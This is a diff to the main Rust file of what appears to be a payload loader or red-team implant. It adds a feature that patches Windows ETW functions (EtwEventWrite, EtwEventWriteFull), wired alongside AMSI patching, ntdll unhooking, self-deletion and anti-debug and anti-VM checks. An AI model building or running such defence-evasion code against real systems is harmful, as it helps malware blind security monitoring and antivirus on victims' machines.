@@ -12,7 +12,7 @@ mod benign;
 #[cfg(any(feature = "CheckAntiDebugProcessDebugFlags", feature = "CheckAntiDebugSystemDebugControl", feature = "CheckAntiDebugRemoteDebugger", feature = "CheckAntiDebugNtGlobalFlag", feature = "CheckAntiDebugProcessList", feature = "CheckAntiDebugHardwareBreakpoints", feature = "CheckAntiVMCPU", feature = "CheckAntiVMRAM", feature = "CheckAntiVMUSB", feature = "CheckAntiVMProcesses", feature = "CheckAntiVMHyperV", feature = "CheckDomainJoined"))]
 mod checks;
 
-#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking", feature = "EvasionAMSIHwbp", feature = "EvasionSelfDeletion", feature = "EvasionETWWinAPI", feature = "EvasionETWpEventWrite"))]
+#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking", feature = "EvasionAMSIHwbp", feature = "EvasionSelfDeletion", feature = "EvasionETWWinAPI", feature = "EvasionETWpEventWrite", feature = "EvasionETWpEventWrite2"))]
 mod evasion;
 
 // AES encryption support
@@ -29,7 +29,7 @@ mod args;
 const ENCPAYLOAD: &[u8] = &[];
 
 /// Run all enabled evasion techniques
-#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking", feature = "EvasionAMSIHwbp", feature = "EvasionETWWinAPI", feature = "EvasionETWpEventWrite"))]
+#[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking", feature = "EvasionAMSIHwbp", feature = "EvasionETWWinAPI", feature = "EvasionETWpEventWrite", feature = "EvasionETWpEventWrite2"))]
 fn run_evasion_techniques() {
     #[cfg(feature = "EvasionNtdllUnhooking")]
     {
@@ -62,6 +62,12 @@ fn run_evasion_techniques() {
         let _ = evasion::etw::patch_etwp_event_write_full_start();
     }
 
+    #[cfg(feature = "EvasionETWpEventWrite2")]
+    {
+        let _ = evasion::etw::patch_etwp_event_write_full_call(evasion::etw::Patch2::PatchEtwEventWrite);
+        let _ = evasion::etw::patch_etwp_event_write_full_call(evasion::etw::Patch2::PatchEtwEventWriteFull);
+    }
+
     #[cfg(feature = "EvasionSelfDeletion")]
     {
         let _ = evasion::misc::delete_self_from_disk();
@@ -88,7 +94,7 @@ fn main() {
     // =======================================================================
     // Evasion techniques
     // =======================================================================
-    #[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking", feature = "EvasionAMSIHwbp", feature = "EvasionETWWinAPI", feature = "EvasionETWpEventWrite"))]
+    #[cfg(any(feature = "EvasionAMSISimplePatch", feature = "EvasionETWSimple", feature = "EvasionNtdllUnhooking", feature = "EvasionAMSIHwbp", feature = "EvasionETWWinAPI", feature = "EvasionETWpEventWrite", feature = "EvasionETWpEventWrite2"))]
     run_evasion_techniques();
 
     // =======================================================================
